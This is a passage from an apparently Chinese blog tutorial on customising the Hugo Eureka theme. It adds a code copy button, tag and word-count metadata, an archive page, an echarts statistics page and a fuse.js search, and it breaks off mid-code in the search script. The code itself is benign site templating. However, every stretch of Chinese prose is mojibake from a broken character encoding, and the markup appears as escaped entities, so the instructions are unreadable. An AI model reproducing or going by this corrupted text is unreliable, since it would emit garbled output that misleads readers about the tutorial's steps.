function addCopyButton(containerEl) { var copyBtn = document.createElement(\u0026#34;button\u0026#34;); copyBtn.className = \u0026#34;highlight-copy-btn\u0026#34;; copyBtn.textContent = \u0026#34;Copy\u0026#34;; var codeEl = containerEl.firstElementChild; copyBtn.addEventListener(\u0026#34;click\u0026#34;, function () { try { var selection = selectText(codeEl); navigator.clipboard.writeText(selection); selection.removeAllRanges(); flashCopyMessage(copyBtn, \u0026#34;Copied!\u0026#34;); } catch (e) { console \u0026amp;\u0026amp; console.log(e); flashCopyMessage(copyBtn, \u0026#34;Failed :(\u0026#34;); } }); containerEl.appendChild(copyBtn); } // Add copy button to code blocks var highlightBlocks = document.getElementsByClassName(\u0026#34;highlight\u0026#34;); Array.prototype.forEach.call(highlightBlocks, addCopyButton); })(); ç„¶ååœ¨/themes/eureka/layouts/partials/footer.htmlæœ«å°¾åŠ ä¸Šï¼š\n\u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;{{.Site.BaseURL}}css/copy-btn.css\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;{{.Site.BaseURL}}js/copy-btn.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒEurekaä¸»é¢˜è¿˜éœ€æ›´æ”¹config.yamlæ–‡ä»¶ä¸­markup-\u0026gt;highlightï¼š\nmarkup: ## Do not modify markup.highlight highlight: codeFences: true noClasses: false guessSyntax : true lineNoStart : 1 tabWidth : 4 anchorLineNos : true lineAnchors : \u0026#39;\u0026#39; noHl : false å¯èƒ½éœ€è¦æ›´æ”¹themes/eureka/assets/css/highlightjs.cssä¸ºï¼š\n/* hljs.js */ .hljs { background-color: transparent !important; color: var(--color-tertiary-text) !important; padding: 0 !important; position: relative; } æ•ˆæœå¦‚å›¾ï¼š\nåœ¨æ–‡ç« åˆ—è¡¨ä¸­æ˜¾ç¤ºtag è¦†ç›–themes/eureka/layouts/partials/components/post-metadata.htmlä¸ºï¼š\n\u0026lt;div class=\u0026#34;text-tertiary-text not-prose mt-2 flex flex-row flex-wrap items-center\u0026#34; \u0026gt; \u0026lt;div class=\u0026#34;me-6 my-2\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fas fa-calendar me-1\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;span \u0026gt;{{ .Date.Format (.Site.Params.dateFormat | default \u0026#34;2006-01-02\u0026#34;) }}\u0026lt;/span \u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;me-6 my-2\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fas fa-clock me-1\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;span\u0026gt;{{ i18n \u0026#34;readingTime\u0026#34; .ReadingTime }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; {{ with .GetTerms \u0026#34;categories\u0026#34; }} \u0026lt;div class=\u0026#34;me-6 my-2\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fas fa-folder me-1\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; {{ range $index, $value := . }} {{ if gt $index 0 }} \u0026lt;span\u0026gt;, \u0026lt;/span\u0026gt; {{ end -}} \u0026lt;a href=\u0026#34;{{ .Permalink }}\u0026#34; class=\u0026#34;hover:text-eureka\u0026#34; \u0026gt;{{ .LinkTitle }}\u0026lt;/a \u0026gt; {{ end }} \u0026lt;/div\u0026gt; {{ end }} {{ with .GetTerms \u0026#34;tags\u0026#34; }} \u0026lt;div class=\u0026#34;me-6 my-2\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fa-solid fa-tag\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; {{ range $index, $value := . }} {{ if gt $index 0 }} \u0026lt;span\u0026gt;, \u0026lt;/span\u0026gt; {{ end -}} \u0026lt;a href=\u0026#34;{{ .Permalink }}\u0026#34; class=\u0026#34;hover:text-eureka\u0026#34; \u0026gt;{{ .LinkTitle }}\u0026lt;/a \u0026gt; {{ end }} \u0026lt;/div\u0026gt; {{ end }} {{ with .GetTerms \u0026#34;series\u0026#34; }} \u0026lt;div class=\u0026#34;me-6 my-2\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fas fa-th-list me-1\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; {{ range $index, $value := . }} {{ if gt $index 0 }} \u0026lt;span\u0026gt;, \u0026lt;/span\u0026gt; {{ end -}} \u0026lt;a href=\u0026#34;{{ .Permalink }}\u0026#34; class=\u0026#34;hover:text-eureka\u0026#34; \u0026gt;{{ .LinkTitle }}\u0026lt;/a \u0026gt; {{ end }} \u0026lt;/div\u0026gt; {{ end }} \u0026lt;/div\u0026gt; åœ¨æ–‡ç« å¼€å¤´æ˜¾ç¤ºå­—æ•° Eurekaé»˜è®¤åªæ˜¾ç¤ºé˜…è¯»ç”¨æ—¶ï¼Œè¿™æœ‰æ—¶å€™éå¸¸è›‹ç–¼ï¼Œå› ä¸ºæœºå™¨çš„é˜…è¯»ç”¨æ—¶å’Œæˆ‘ä»¬äººå·®è·å¾ˆå¤§ï¼Œæ²¡æ³•ç›´è§‚åœ°ä½“ç°å‡ºæ–‡ç« æœ‰å¤šé•¿\næˆ‘ä»¬å¯ä»¥åœ¨themes/eureka/layouts/partials/components/post-metadata.htmlä¸­é˜…è¯»ç”¨æ—¶é‚£ä¸ªdivå‰é¢å¢åŠ ï¼š\n\u0026lt;div class=\u0026#34;me-6 my-2\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fa-solid fa-file-pen\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;span\u0026gt;æœ¬æ–‡å…±{{ plainify .WordCount }}å­—\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; ä¹Ÿå°±æ˜¯è¿™é‡Œï¼š\nä½¿ç”¨obsidianæ¨¡æ¿è‡ªåŠ¨ç”Ÿæˆæ–‡ç« å¤´éƒ¨ éœ€è¦ä¸‹è½½æ’ä»¶Templaterï¼Œè¯·é˜…è¯»å…¶å®˜æ–¹æ–‡æ¡£ä¸­æ¨¡æ¿çš„å†™æ³•ï¼ˆç½‘ä¸Šæœ‰äº›åšå®¢çš„æ•™ç¨‹æ˜¯æ—§ç‰ˆçš„ï¼Œç°åœ¨å·²ç»ä¸èƒ½ç”¨äº†ï¼‰\nç¤ºä¾‹å¦‚ä¸‹ï¼š\nä½¿ç”¨æ—¶æŒ‰Alt+Eå°±è¡Œ\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸ºäº†é¿å…hugoè§£æcontentæ–‡ä»¶å¤¹ä¸­å­˜æ”¾æ¨¡æ¿çš„modelæ–‡ä»¶å¤¹ï¼ˆæ¨¡æ¿æ–‡ä»¶å¤¹å¿…é¡»å­˜æ”¾åœ¨obsidianä»“åº“å†…ï¼‰ï¼Œæˆ‘ä»¬éœ€è¦åœ¨comfig.yamlä¸­æŒ‡å®šignoreçš„patternï¼š\nå…·ä½“è¯¦è§Configure Hugo |Hugo\nå¢å¼ºå†…å®¹ ä¸‹é¢ä¼šç”¨åˆ°çš„å¤–éƒ¨jsä»£ç è¯·ä¸‹è½½æ­¤é™„ä»¶\nä¸‹è½½è§£å‹åæ”¾åœ¨/static/jsä¸­\nå¢åŠ å½’æ¡£é¡µ è¯·åŠ¡å¿…ä¸‹è½½å¤–éƒ¨jsä»£ç ï¼\nåœ¨/themes/eureka/layouts/_default/æ–‡ä»¶å¤¹ä¸‹æ–°å»ºarchive.htmlï¼Œå¹¶å¡«å…¥ï¼š\n{{/* layouts/_default/archive.html */}} {{ define \u0026#34;main\u0026#34; }} {{ $hasToc := and (in .TableOfContents \u0026#34;\u0026lt;li\u0026gt;\u0026#34; ) (.Params.toc) }} {{ $hasSidebar := or ($hasToc) (.Params.series) }} \u0026lt;div class=\u0026#34;grid grid-cols-2 lg:grid-cols-8 gap-4 lg:pt-12\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-span-2 {{ if not $hasSidebar }} {{- print \u0026#34; lg:col-start-2\u0026#34; -}} {{ end }} lg:col-span-6 bg-secondary-bg rounded px-6 py-8\u0026#34;\u0026gt; \u0026lt;!-- \u0026lt;h1 class=\u0026#34;font-bold text-3xl text-primary-text\u0026#34;\u0026gt;{{ .Title }}\u0026lt;/h1\u0026gt; --\u0026gt; \u0026lt;h1 class=\u0026#34;font-bold text-3xl text-primary-text\u0026#34;\u0026gt;å½’æ¡£\u0026lt;/h1\u0026gt; \u0026lt;div class=\u0026#34;flex flex-wrap flex-row items-center my-2 text-tertiary-text\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;mr-6 my-2\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fas fa-calendar mr-1\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;span\u0026gt;{{ .Date.Format (.Site.Params.dateFormat | default \u0026#34;2006-01-02\u0026#34;) }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; {{ $featured := partial \u0026#34;utils/get-featured.html\u0026#34; . }} {{ with $featured }} \u0026lt;div class=\u0026#34;my-4\u0026#34;\u0026gt; {{ . }} \u0026lt;/div\u0026gt; {{ end }} \u0026lt;div class=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;script type=\u0026#39;text/javascript\u0026#39; src=\u0026#34;{{.Site.BaseURL}}js/jquery.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt; .car-collapse .car-yearmonth { cursor: s-resize; } \u0026lt;/style\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; /* \u0026lt;![CDATA[ */ jQuery(document).ready(function () { jQuery(\u0026#39;.car-collapse\u0026#39;).find(\u0026#39;.car-monthlisting\u0026#39;).hide(); jQuery(\u0026#39;.car-collapse\u0026#39;).find(\u0026#39;.car-monthlisting:first\u0026#39;).show(); jQuery(\u0026#39;.car-collapse\u0026#39;).find(\u0026#39;.car-yearmonth\u0026#39;).click(function () { jQuery(this).next(\u0026#39;ul\u0026#39;).slideToggle(\u0026#39;fast\u0026#39;); }); jQuery(\u0026#39;.car-collapse\u0026#39;).find(\u0026#39;.car-toggler\u0026#39;).click(function () { if (\u0026#39;å±•å¼€å…¨éƒ¨\u0026#39; == jQuery(this).text()) { jQuery(this).parent(\u0026#39;.car-container\u0026#39;).find(\u0026#39;.car-monthlisting\u0026#39;).show(); jQuery(this).text(\u0026#39;æŠ˜å å…¨éƒ¨\u0026#39;); } else { jQuery(this).parent(\u0026#39;.car-container\u0026#39;).find(\u0026#39;.car-monthlisting\u0026#39;).hide(); jQuery(this).text(\u0026#39;å±•å¼€å…¨éƒ¨\u0026#39;); } return false; }); }); /* ]]\u0026gt; */ \u0026lt;/script\u0026gt; \u0026lt;div class=\u0026#34;car-container car-collapse\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34; class=\u0026#34;car-toggler\u0026#34; style=\u0026#34;color: darkgray;\u0026#34;\u0026gt;å±•å¼€å…¨éƒ¨\u0026lt;/a\u0026gt; \u0026lt;ul class=\u0026#34;car-list\u0026#34;\u0026gt; {{ range (.Site.RegularPages.GroupByDate \u0026#34;2006å¹´ 01æœˆ\u0026#34;) }} \u0026lt;li\u0026gt; \u0026lt;span class=\u0026#34;car-yearmonth\u0026#34;\u0026gt;\u0026lt;span style=\u0026#34;color: rgba(255, 105, 105, 0.737);font-weight: bold;\u0026#34;\u0026gt;{{ .Key }}\u0026lt;/span\u0026gt; \u0026lt;span title=\u0026#34;Post Count\u0026#34;\u0026gt; å…±{{ len .Pages }}ç¯‡\u0026lt;/span\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;ul class=\u0026#34;car-monthlisting\u0026#34; style=\u0026#34;display: block;\u0026#34;\u0026gt; {{ range .Pages }} \u0026lt;li style=\u0026#34;text-indent:2em;\u0026#34;\u0026gt; \u0026lt;span style=\u0026#34;color: rgb(100, 100, 100);\u0026#34;\u0026gt;{{ .Date.Format \u0026#34;02æ—¥\u0026#34;}} \u0026lt;/span\u0026gt;\u0026lt;b\u0026gt;\u0026lt;a href=\u0026#34;{{ .Permalink }}\u0026#34; style=\u0026#34;margin-left: 1em;\u0026#34;\u0026gt;{{ .Title }} \u0026lt;/a\u0026gt;\u0026lt;/b\u0026gt; \u0026lt;!-- \u0026lt;span title=\u0026#34;Comment Count\u0026#34;\u0026gt;(0)\u0026lt;/span\u0026gt; --\u0026gt; \u0026lt;/li\u0026gt; {{ end }} \u0026lt;/ul\u0026gt; \u0026lt;/li\u0026gt; {{ end }} \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; {{ end }} ç„¶åæ–°å»ºcontent/archive/archive.mdå¹¶å¡«å…¥frontmatterï¼š\n--- layout: archive title: \u0026#34;å½’æ¡£\u0026#34; date: 2022-12-29T3:01:44+08:00 draft: false --- æœ€ååœ¨menu.yamlåŠ ä¸Šå¯¹å®ƒçš„ç´¢å¼•å°±å¥½äº†ï¼š\næ¥æºè§Hugo ä¸»é¢˜ Eureka è‡ªå®šä¹‰ | æ€¡çº¢é™¢è½\nå¢åŠ ç»Ÿè®¡é¡µ è¯·åŠ¡å¿…ä¸‹è½½å¤–éƒ¨jsä»£ç ï¼\nåœ¨/themes/eureka/layouts/_default/æ–‡ä»¶å¤¹ä¸‹æ–°å»ºstats.htmlï¼Œå¹¶å¡«å…¥ï¼š\n{{/* layouts/_default/stats.html */}} {{ define \u0026#34;main\u0026#34; }} {{- $.Scratch.Add \u0026#34;stats\u0026#34; slice -}} {{- range .Site.RegularPages -}} {{- $.Scratch.Add \u0026#34;stats\u0026#34; (dict \u0026#34;title\u0026#34; .Title \u0026#34;slug\u0026#34; .Slug \u0026#34;year\u0026#34; (.Date.Format \u0026#34;2006\u0026#34;) \u0026#34;month\u0026#34; (.Date.Format \u0026#34;2006-01\u0026#34;) \u0026#34;hour\u0026#34; (.Date.Format \u0026#34;15\u0026#34;) \u0026#34;week\u0026#34; (.Date.Format \u0026#34;Monday\u0026#34;) \u0026#34;count\u0026#34; .WordCount) -}} {{- end -}} {{ $hasToc := and (in .TableOfContents \u0026#34;\u0026lt;li\u0026gt;\u0026#34; ) (.Params.toc) }} {{ $hasSidebar := or ($hasToc) (.Params.series) }} \u0026lt;style\u0026gt; .chart { margin-top: 15px; width: 100%; height: 350px; } \u0026lt;/style\u0026gt; \u0026lt;div class=\u0026#34;grid grid-cols-2 lg:grid-cols-8 gap-4 lg:pt-12\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-span-2 {{ if not $hasSidebar }} {{- print \u0026#34;lg:col-start-2\u0026#34; -}} {{ end }} lg:col-span-6 bg-secondary-bg rounded px-6 py-8\u0026#34;\u0026gt; \u0026lt;!-- \u0026lt;h1 class=\u0026#34;font-bold text-3xl text-primary-text\u0026#34;\u0026gt;{{ .Title }}\u0026lt;/h1\u0026gt; --\u0026gt; \u0026lt;h1 class=\u0026#34;font-bold text-3xl text-primary-text\u0026#34;\u0026gt;ç»Ÿè®¡\u0026lt;/h1\u0026gt; \u0026lt;div class=\u0026#34;flex flex-wrap flex-row items-center my-2 text-tertiary-text\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;mr-6 my-2\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fas fa-calendar mr-1\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;span\u0026gt;{{ .Date.Format (.Site.Params.dateFormat | default \u0026#34;2006-01-02\u0026#34;) }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; {{ $featured := partial \u0026#34;utils/get-featured\u0026#34; . }} {{ with $featured }} \u0026lt;div class=\u0026#34;my-4\u0026#34;\u0026gt; {{ . }} \u0026lt;/div\u0026gt; {{ end }} \u0026lt;div class=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;p id=\u0026#34;basic-info\u0026#34;\u0026gt;\u0026lt;i class=\u0026#34;fa-solid fa-spinner\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;åŠ è½½ä¸­...\u0026lt;/p\u0026gt; \u0026lt;h2 id=\u0026#34;æ–‡ç« æ•°ç»Ÿè®¡\u0026#34;\u0026gt;\u0026lt;/h2\u0026gt; \u0026lt;div id=\u0026#34;year-stat\u0026#34; class=\u0026#34;chart\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;month-stat\u0026#34; class=\u0026#34;chart\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;h2 id=\u0026#34;æ—¶é—´æ®µç»Ÿè®¡\u0026#34;\u0026gt;\u0026lt;/h2\u0026gt; \u0026lt;div id=\u0026#34;hour-stat\u0026#34; class=\u0026#34;chart\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;weekday-stat\u0026#34; class=\u0026#34;chart\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; {{ if $hasSidebar}} \u0026lt;div class=\u0026#34;col-span-2\u0026#34;\u0026gt; {{ if .GetTerms \u0026#34;series\u0026#34; }} {{ partial \u0026#34;components/post-series.html\u0026#34; . }} {{ end }} {{ if $hasToc }} {{ partial \u0026#34;components/post-toc.html\u0026#34; . }} {{ end }} \u0026lt;/div\u0026gt; {{ end }} \u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;{{.Site.BaseURL}}js/echarts.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; const data = {{- $.Scratch.Get \u0026#34;stats\u0026#34; -}}; function showChart(id, title, type, d) { var chart = echarts.init(document.getElementById(id)); var xData = []; var yData = []; d.forEach(function(item) { xData.push(item[0]); yData.push(item[1]); }); var option = { title : { text : title }, tooltip : { trigger : \u0026#39;axis\u0026#39; }, xAxis : [ { type : \u0026#39;category\u0026#39;, data : xData } ], yAxis : [ { type : \u0026#39;value\u0026#39; } ], grid : { x : 35, y : 45, x2 : 35, y2 : 35 }, series : [ { type : \u0026#39;bar\u0026#39;, name : type, data : yData, markLine : { data : [ { type : \u0026#39;average\u0026#39;, name : \u0026#39;å¹³å‡å€¼\u0026#39; }], itemStyle : { normal : { color : \u0026#39;#4087bd\u0026#39; } } }, itemStyle : { normal : { color : \u0026#39;#87cefa\u0026#39; } } }] }; chart.setOption(option); } window.addEventListener(\u0026#39;load\u0026#39;, function() { basicInfo(); yearStats(); monthStats(); hourStats(); weekStats(); }); function basicInfo() { const articles = {{ len (where .Site.RegularPages \u0026#34;Section\u0026#34; \u0026#34;posts\u0026#34;) }}; const writeup = {{ len (where .Site.RegularPages \u0026#34;Section\u0026#34; \u0026#34;writeup\u0026#34;) }}; const principle = {{ len (where .Site.RegularPages \u0026#34;Section\u0026#34; \u0026#34;principle\u0026#34;) }}; const tricks = {{ len (where .Site.RegularPages \u0026#34;Section\u0026#34; \u0026#34;tricks\u0026#34;) }}; const pages = articles + writeup + principle + tricks; //const comments = data.reduce((count, article) =\u0026gt; count + article.comments, 0); const words = data.reduce((count, article) =\u0026gt; count + article.count, 0); document.querySelector(\u0026#39;#basic-info\u0026#39;).innerHTML = ` \u0026lt;span\u0026gt;æ€»æ–‡ç« æ•°ï¼š\u0026lt;strong\u0026gt;\u0026lt;a href=\u0026#34;/\u0026#34;\u0026gt;${pages}\u0026lt;/a\u0026gt;\u0026lt;/strong\u0026gt; ç¯‡\u0026lt;/span\u0026gt;ï¼› \u0026lt;span\u0026gt;Postsï¼š\u0026lt;strong\u0026gt;\u0026lt;a href=\u0026#34;/posts/\u0026#34;\u0026gt;${articles}\u0026lt;/a\u0026gt;\u0026lt;/strong\u0026gt; ç¯‡\u0026lt;/span\u0026gt;ï¼› \u0026lt;span\u0026gt;WriteUpsï¼š\u0026lt;strong\u0026gt;\u0026lt;a href=\u0026#34;/writeup/\u0026#34;\u0026gt;${writeup}\u0026lt;/a\u0026gt;\u0026lt;/strong\u0026gt; ç¯‡\u0026lt;/span\u0026gt;ï¼› \u0026lt;span\u0026gt;Tricksï¼š\u0026lt;strong\u0026gt;\u0026lt;a href=\u0026#34;/tricks/\u0026#34;\u0026gt;${tricks}\u0026lt;/a\u0026gt;\u0026lt;/strong\u0026gt; ç¯‡\u0026lt;/span\u0026gt;ï¼› \u0026lt;span\u0026gt;Principleï¼š\u0026lt;strong\u0026gt;\u0026lt;a href=\u0026#34;/principle/\u0026#34;\u0026gt;${principle}\u0026lt;/a\u0026gt;\u0026lt;/strong\u0026gt; ç¯‡\u0026lt;/span\u0026gt;ï¼› \u0026lt;span\u0026gt;æ€»å­—æ•°ï¼š\u0026lt;strong\u0026gt;${words}\u0026lt;/strong\u0026gt;\u0026lt;/span\u0026gt;ï¼› `; }; function yearStats() { const yearGroup = {}; data.forEach(article =\u0026gt; { const year = parseInt(article.year); if(!yearGroup.hasOwnProperty(year)) { yearGroup[year] = 0; } yearGroup[year] += 1; }); const d = []; for(let i = 2022; i \u0026lt;= (new Date().getFullYear()); i++) { d.push([i, yearGroup[i] || 0]); } showChart(\u0026#39;year-stat\u0026#39;, \u0026#39;æ–‡ç« æ•° - æŒ‰å¹´ç»Ÿè®¡\u0026#39;, \u0026#39;æ–‡ç« æ•°\u0026#39;, d); } function monthStats() { const monthGroup = {}; data.forEach(article =\u0026gt; { if(!monthGroup.hasOwnProperty(article.month)) { monthGroup[article.month] = 0; } monthGroup[article.month] += 1; }); const d = []; for(let year = 2022; year \u0026lt;= (new Date().getFullYear()); year++) { for(let month = 1; month \u0026lt; 13; month++) { const text = `${year}-${month \u0026lt; 10 ? \u0026#39;0\u0026#39; + month : month}`; d.push([text, monthGroup[text] || 0]); } } showChart(\u0026#39;month-stat\u0026#39;, \u0026#39;æ–‡ç« æ•° - æŒ‰æœˆç»Ÿè®¡\u0026#39;, \u0026#39;æ–‡ç« æ•°\u0026#39;, d); } function hourStats() { const hourGroup = {}; data.forEach(article =\u0026gt; { const hour = parseInt(article.hour); if(!hourGroup.hasOwnProperty(hour)) { hourGroup[hour] = 0; } hourGroup[hour] += 1; }); const d = [ [\u0026#39;00:00-01:00\u0026#39;], [\u0026#39;01:00-02:00\u0026#39;], [\u0026#39;02:00-03:00\u0026#39;], [\u0026#39;03:00-04:00\u0026#39;], [\u0026#39;04:00-05:00\u0026#39;], [\u0026#39;05:00-06:00\u0026#39;], [\u0026#39;06:00-07:00\u0026#39;], [\u0026#39;07:00-08:00\u0026#39;], [\u0026#39;08:00-09:00\u0026#39;], [\u0026#39;09:00-10:00\u0026#39;], [\u0026#39;10:00-11:00\u0026#39;], [\u0026#39;11:00-12:00\u0026#39;], [\u0026#39;12:00-13:00\u0026#39;], [\u0026#39;13:00-14:00\u0026#39;], [\u0026#39;14:00-15:00\u0026#39;], [\u0026#39;15:00-16:00\u0026#39;], [\u0026#39;16:00-17:00\u0026#39;], [\u0026#39;17:00-18:00\u0026#39;], [\u0026#39;18:00-19:00\u0026#39;], [\u0026#39;19:00-20:00\u0026#39;], [\u0026#39;20:00-21:00\u0026#39;], [\u0026#39;21:00-22:00\u0026#39;], [\u0026#39;22:00-23:00\u0026#39;], [\u0026#39;23:00-24:00\u0026#39;] ].map((item, key) =\u0026gt; { item[1] = hourGroup[key] || 0; return item; }); showChart(\u0026#39;hour-stat\u0026#39;, \u0026#39;æ–‡ç« æ•° - æŒ‰æ—¶æ®µç»Ÿè®¡\u0026#39;, \u0026#39;æ–‡ç« æ•°\u0026#39;, d); } function weekStats() { const weekGroup = {}; data.forEach(article =\u0026gt; { if(!weekGroup.hasOwnProperty(article.week)) { weekGroup[article.week] = 0; } weekGroup[article.week] += 1; }); const d = [ [\u0026#39;æ˜ŸæœŸä¸€\u0026#39;, weekGroup.Monday], [\u0026#39;æ˜ŸæœŸäºŒ\u0026#39;, weekGroup.Tuesday], [\u0026#39;æ˜ŸæœŸä¸‰\u0026#39;, weekGroup.Wednesday], [\u0026#39;æ˜ŸæœŸå››\u0026#39;, weekGroup.Thursday], [\u0026#39;æ˜ŸæœŸäº”\u0026#39;, weekGroup.Friday], [\u0026#39;æ˜ŸæœŸå…­\u0026#39;, weekGroup.Saturday], [\u0026#39;æ˜ŸæœŸæ—¥\u0026#39;, weekGroup.Sunday] ]; showChart(\u0026#39;weekday-stat\u0026#39;, \u0026#39;æ–‡ç« æ•° - æŒ‰æ˜ŸæœŸå‡ ç»Ÿè®¡\u0026#39;, \u0026#39;æ–‡ç« æ•°\u0026#39;, d); } \u0026lt;/script\u0026gt; {{ end }} å…¶ä¸­å‡½æ•°basicInfoå¯è‡ªå®šä¹‰æ˜¾ç¤ºçš„æ¨¡å—ä¿¡æ¯\nç„¶åæ–°å»ºcontent/stats/stats.mdå¹¶å¡«å…¥frontmatterï¼š\n--- layout: stats title: \u0026#34;ç»Ÿè®¡\u0026#34; date: 2022-12-29T3:01:44+08:00 draft: false slug: \u0026#34;stats\u0026#34; --- æ¥æºï¼šHugo ä¸»é¢˜ Eureka è‡ªå®šä¹‰ | æ€¡çº¢é™¢è½\nå¢åŠ æœç´¢åŠŸèƒ½ è¯·åŠ¡å¿…ä¸‹è½½å¤–éƒ¨jsä»£ç ï¼\nåœ¨config.yamlä¸­åŠ ä¸Šï¼š\noutputs: home: - \u0026#34;HTML\u0026#34; - \u0026#34;RSS\u0026#34; - \u0026#34;JSON\u0026#34; ç„¶åæ–°å»ºthemes/eureka/layouts/index.jsonå¡«å…¥ï¼š\n{{- $.Scratch.Add \u0026#34;index\u0026#34; slice -}} {{- range .Site.RegularPages -}} {{- $.Scratch.Add \u0026#34;index\u0026#34; (dict \u0026#34;title\u0026#34; .Title \u0026#34;tags\u0026#34; .Params.tags \u0026#34;categories\u0026#34; .Params.categories \u0026#34;contents\u0026#34; .Plain \u0026#34;summary\u0026#34; .Summary \u0026#34;permalink\u0026#34; .Permalink \u0026#34;date\u0026#34; (.Date.Format \u0026#34;2006å¹´01æœˆ02æ—¥\u0026#34;) \u0026#34;section\u0026#34; .Section) -}} {{- end -}} {{- $.Scratch.Get \u0026#34;index\u0026#34; | jsonify -}} å‚è§Hugo ä¹‹æ—… | æ€¡çº¢é™¢è½\nåœ¨themes/eureka/layouts/partials/header.htmlä¸­æ‰¾åˆ°æœ‰å¾ˆå¤šä¸ªdivå…ƒç´ å¹¶åˆ—çš„åœ°æ–¹ï¼Œå¹¶åŠ ä¸Šï¼š\n\u0026lt;div class=\u0026#34;flex\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;search-container relative pt-4 md:pt-0\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;search\u0026#34;\u0026gt; \u0026lt;form role=\u0026#34;search\u0026#34; class=\u0026#34;search-form\u0026#34; action=\u0026#34;/search.html\u0026#34; method=\u0026#34;get\u0026#34;\u0026gt; \u0026lt;label\u0026gt; \u0026lt;input name=\u0026#34;q\u0026#34; type=\u0026#34;text\u0026#34; placeholder=\u0026#34;æœç´¢ ...\u0026#34; class=\u0026#34;search-field\u0026#34;\u0026gt; \u0026lt;/label\u0026gt; \u0026lt;button\u0026gt; \u0026lt;i class=\u0026#34;fa-solid fa-magnifying-glass\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; ç„¶ååœ¨æ–‡ä»¶æœ€ä¸Šé¢åŠ ä¸Šï¼š\n\u0026lt;style\u0026gt; .search-container { margin-top: -0.3rem; margin-right: 1rem; } .search-container .search { border: 1px solid #e2e8f0; border-radius: 4px; } .search-container input { padding-left: 1rem; line-height: 2rem; outline: none; background: transparent; } .search-container button { font-size: 0.8rem; margin-right: 0.5rem; color: #e2e8f0; } \u0026lt;/style\u0026gt; ç„¶åæ–°å»ºthemes/eureka/layouts/_default/search.htmlï¼Œå†…å®¹å¦‚ä¸‹ï¼š\n{{/* layouts/_default/search.html */}} {{ define \u0026#34;main\u0026#34; }} \u0026lt;div class=\u0026#34;w-full max-w-screen-xl lg:px-4 xl:px-8 mx-auto\u0026#34;\u0026gt; \u0026lt;article class=\u0026#34;mx-6 my-8\u0026#34;\u0026gt; \u0026lt;h1 id=\u0026#34;search-count\u0026#34; class=\u0026#34;font-bold text-3xl text-primary-text\u0026#34;\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;/article\u0026gt; \u0026lt;div id=\u0026#34;search-result\u0026#34; class=\u0026#34;bg-secondary-bg rounded overflow-hidden px-4 divide-y\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;{{.Site.BaseURL}}js/fuse.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;!-- \u0026lt;script src=\u0026#34;https://cdn.jsdelivr.net/npm/fuse.js/dist/fuse.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; --\u0026gt; \u0026lt;script\u0026gt; document.addEventListener(\u0026#39;DOMContentLoaded\u0026#39;, async () =\u0026gt; { const qs = new URLSearchParams(location.search); const searchResult = document.querySelector(\u0026#39;#search-result\u0026#39;); const searchCount = document.querySelector(\u0026#39;#search-count\u0026#39;); const fuseOptions = { shouldSort: true, includeMatches: true, threshold: 0.6, tokenize: true, location: 0, distance: 100, maxPatternLength: 32, minMatchCharLength: 1, findAllMatches: true, useExtendedSearch: true, keys: [{ name: \u0026#34;title\u0026#34;, weight: 0.8 }, { name: \u0026#34;summary\u0026#34;, weight: 0.2 }, { name: 